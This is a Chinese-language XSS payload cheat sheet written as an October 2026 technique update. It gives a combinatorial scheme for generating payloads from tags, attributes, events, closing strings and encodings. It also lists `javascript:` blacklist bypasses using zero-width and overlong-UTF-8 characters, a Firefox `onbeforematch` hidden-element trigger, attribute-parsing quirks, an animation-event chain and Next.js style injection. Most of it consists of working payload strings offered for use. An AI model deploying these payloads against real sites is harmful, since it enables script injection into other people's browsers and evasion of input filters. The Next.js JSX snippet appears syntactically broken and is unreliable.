## 2026-10 情报批增量（基因突变法 + 隐藏元素 + 组件注入）

**A. “基因突变法”拼装体系**（@n0aziXss）——按 7 维交叉组合生成载荷：
- 标签×16：a/p/img/body/script/var/div/object/input/select/iframe/frameset/embed/svg/video/audio
- 特殊属性×12：src/dynsrc/lowsrc/href/action/data/background/formaction/poster/code/location/name
- 伪协议×2：`javascript:` / `data:`
- 恶意代码×6：`alert()`/`confirm()`/`prompt()`/`self.location`/`top.location`/`location.href`
- 事件×7+：onerror/onclick/onblur/onmousedown/onmouseup/onmouseover/onmousemove
- 闭合部：按上下文穷举闭合符（`">`、`'>`、`</script>` 等）；敏感词替换变体（大小写、拼接、注释切分）
- 编码混淆×4：HTML encode / Unicode encode / URL encode / Base64

**B. `javascript:` 黑名单绕过**：`java%E2%80%8Bscript:alert(1)`（零宽空格）、`java%C0%80script:alert(1)`（overlong UTF-8）、`javascript:top[name](1)`；无 alert 调用链：
```
javascript:Promise.resolve(name).then(top[name])
javascript:Reflect.apply(top[name],null,[1])
javascript:top["setTimeout"](name)
```

**C. void/hidden 元素 XSS（Firefox 专有，访问 URL#p 触发）**：`hidden="until-found"` + `onbeforematch`（@Zerodaylabowner 2026-07-17）：
```html
<meta name="description" content="hello" id="p" hidden="until-found" onbeforematch="alert(document.domain)">
<input type="hidden" id="p" hidden="until-found" onbeforematch="alert(document.domain)">
```

**D. 属性解析怪异**：`<img src='1' onerror/=alert(0) />`（IE/FF/Chrome/Safari）；`<img src='1' onerror\x00=alert(0) />`（IE/Safari，属性名后 null/斜杠）。

**E. onanimationend 链**：`<style>@keyframes x {to {opacity:0}}</style><xss style="animation:x 1s" onanimationend=alert(6)>Test6</xss>`

**F. Next.js JSX/CSS 注入系列**（`style={...}` 模板串注入，8 型）：
```jsx
<div style={background-color: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
变体：CSS Variable(--var) / Flexbox / Object Literal / Unicode / Dynamic Font / Animation / Transform / CSS Grid —— 同法换属性名。
